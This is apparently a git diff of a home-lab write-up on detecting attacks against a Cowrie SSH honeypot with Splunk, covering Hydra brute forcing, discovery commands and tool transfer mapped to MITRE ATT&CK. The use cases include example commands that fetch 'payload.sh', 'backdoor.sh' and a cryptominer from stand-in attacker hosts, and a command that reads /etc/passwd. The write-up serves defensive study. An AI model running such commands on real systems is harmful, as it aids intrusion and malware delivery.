@@ -3,7 +3,7 @@ Cowrie Honeypot Attack Stimulation
 
 ---
 
-# Hydra Brute Force Attack Detection
+# 1 Use Case: Hydra Brute Force Attack Detection
 
 ## Objective
 
@@ -95,12 +95,8 @@ The honeypot recorded:
 - Source IP address information
 - Authentication outcomes
 
-  **Confirmation in Kali Linux that the passwords were found**
-
-  <img width="1215" height="274" alt="image" src="https://github.com/user-attachments/assets/82fbee95-0cef-4418-a0d7-3ae770312b35" />
-
-
-   **Confirmation in Honeypot of the login attempts with the passwords**
+ 
+**Confirmation in Honeypot of the login attempts with the passwords**
   ```bash
   grep "login attempt" ~/cowrie/var/log/cowrie/cowrie.log
   ```
@@ -128,23 +124,29 @@ T1110.001 - Password Guessing
 
 ---
 
-## Security Significance
+**This intelligence can be leveraged to improve detections, enrich threat hunting investigations, and enhance defensive monitoring.**
 
-This use case demonstrates how defenders can leverage honeypot telemetry to identify credential access activity before a real system is compromised. Cowrie is configured to accept common passwords and quickly hand over a shell.
+## Outcome
 
-By intentionally exposing a monitored SSH service, Cowrie provides visibility into:
+✅ Simulated a password guessing attack against an SSH service using Hydra
 
-- Common attacker passwords
-- Targeted usernames
-- Brute force patterns
-- Source IP addresses
-- Authentication behavior
+✅ Generated multiple authentication attempts against the Cowrie honeypot
 
-This intelligence can be leveraged to improve detections, enrich threat hunting investigations, and enhance defensive monitoring.
+✅ Captured both successful and failed login events
+
+✅ Recorded attacker username and password combinations
+
+✅ Collected source IP address information for attribution and analysis
+
+✅ Observed credential access behavior consistent with password guessing attacks
+
+✅ Generated session telemetry for threat hunting and investigation
+
+✅ Validated Cowrie's ability to detect and log brute force activity
 
 ---
 
-# Use Case 6: Post-Compromise Discovery
+# Use Case 2: Post-Compromise Discovery
 
 ## Objective
 
@@ -172,11 +174,14 @@ ls
 cat /etc/passwd
 ```
 
+**Kali Linxus (attacker) input**
+
+<img width="453" height="341" alt="Kali Linux Command Screenshot" src="https://github.com/user-attachments/assets/cb7160a7-9f8b-48d8-95ec-17d3eb0138df" />
 
 
+**Cowrie Honeypot Data**
 
-
-
+<img width="569" height="137" alt="Cowrie Command Screenshot" src="https://github.com/user-attachments/assets/6997221c-8032-45f5-bff0-a02cd9da1ae4" />
 
 
 ## MITRE ATT&CK
@@ -198,27 +203,29 @@ cat /etc/passwd
 
 ---
 
-# Use Case 7: File Download & Tool Transfer
+# Use Case 3: File Download & Tool Transfer
 
 ## Objective
 
-Capture malware delivery and tool transfer attempts.
+Demonstrate how defenders can detect, investigate, and analyze adversary attempts to transfer tools, scripts, or malware to a compromised system following initial access.
+
+After obtaining access to a target environment, attackers frequently attempt to download additional resources such as reconnaissance tools, persistence mechanisms, credential theft utilities, remote access trojans (RATs), cryptominers, or custom malware payloads. These actions are often indicative of an attacker transitioning from initial access to post-exploitation activities.
+
+In this use case, a simulated attacker leveraged common Linux utilities (`wget` and `curl`) to download external files from attacker-controlled infrastructure. The Cowrie SSH honeypot captured each command execution event, while Splunk provided centralized visibility into the attempted tool transfers.
 
 ## Attack Simulation
 
 ```bash
-wget http://example.com/test.sh
+
+wget https://malicious.example/payload.sh
+
+curl https://malicious.example/backdoor.sh
+
+wget https://evil.example/cryptominer.tar.gz
 ```
 
-or
+<img width="901" height="472" alt="image" src="https://github.com/user-attachments/assets/e76e3d12-318a-4b64-8f78-638f8a48849f" />
 
-```bash
-curl http://example.com/test.sh
-```
-
-## MITRE ATT&CK
-
-- T1105 – Ingress Tool Transfer
 
 ## Evidence Collected
 
@@ -226,27 +233,49 @@ curl http://example.com/test.sh
 - File transfer activity
 - Command execution telemetry
 
-## Outcome
 
-✅ Tool transfer activity recorded
+## MITRE ATT&CK MAPPING
 
-✅ Command telemetry collected
-
+- T1105 – Ingress Tool Transfer
 ---
 
-# Use Case 8: Threat Intelligence Collection
+# Use Case 4: Threat Intelligence Collection
 
 ## Objective
 
-Aggregate attacker activity into actionable threat intelligence.
+Demonstrate how a honeypot can be leveraged to collect, analyze, and transform attacker activity into actionable threat intelligence.
 
+In this scenario, an attacker successfully authenticated to the Cowrie SSH honeypot and executed reconnaissance and file download commands. The resulting telemetry was forwarded to Splunk, where it was analyzed to identify attacker behavior, command execution activity, and potential indicators of compromise (IOCs).
+
+The goal of this use case is to emulate post-compromise activity and demonstrate how defenders can leverage honeypot telemetry to gain visibility into adversary tactics, techniques, and procedures (TTPs) without exposing production assets to risk.
+
+**Kali Linux Attack**
+
+```bash
+whoami
+wget https://evil.example/bah.sh
+curl https://malicious.example/backdoor.tar.gz
+```
+
+<img width="505" height="199" alt="image" src="https://github.com/user-attachments/assets/dd435065-2ab9-47f0-a14e-584abe7d29fe" />
+
+**Splunk Query for Cowrie Activity**
+
+
+<img width="824" height="623" alt="image" src="https://github.com/user-attachments/assets/f48d85f0-d503-4536-9b6f-c99239b830c9" />
+
+## MITRE ATT&CK
+
+- T1078 – Valid Accounts
+- T1033 – System Owner/User Discovery
+- T1105 – Ingress Tool Transfer
+- T1059 – Command and Scripting Interpreter
+  
 ## Intelligence Collected
 
-- Source IP Addresses
 - Usernames
 - Password Attempts
 - Successful Logins
-- Failed Logins
 - Commands Executed
 - Session Activity
 - File Download Attempts
@@ -259,51 +288,7 @@ Aggregate attacker activity into actionable threat intelligence.
 
 ---
 
-# Use Case 9: Splunk Threat Intelligence Dashboard
 
-## Objective
-
-Visualize attacker activity in real time using Splunk.
-
-## Dashboard Components
-
-- Authentication Activity
-- Top Usernames
-- Top Passwords
-- Source IP Addresses
-- Commands Executed
-- File Download Attempts
-- Event Volume Trends
-
-## Outcome
-
-✅ Live threat intelligence dashboard created
-
-✅ Real-time attack visibility achieved
-
----
-
-# Use Case 10: MITRE ATT&CK Correlation
-
-## Objective
-
-Map Cowrie honeypot activity to MITRE ATT&CK techniques.
-
-| Activity | ATT&CK Technique |
-|-----------|-----------|
-| Nmap Scan | T1595 – Active Scanning |
-| Hydra Attack | T1110 – Brute Force |
-| Successful Login | T1078 – Valid Accounts |
-| Discovery Commands | T1082 – System Information Discovery |
-| File Download Attempt | T1105 – Ingress Tool Transfer |
-
-## Outcome
-
-✅ ATT&CK mapping completed
-
-✅ Adversary behavior categorized
-
-✅ Detection engineering opportunities identified
 
 ---
 
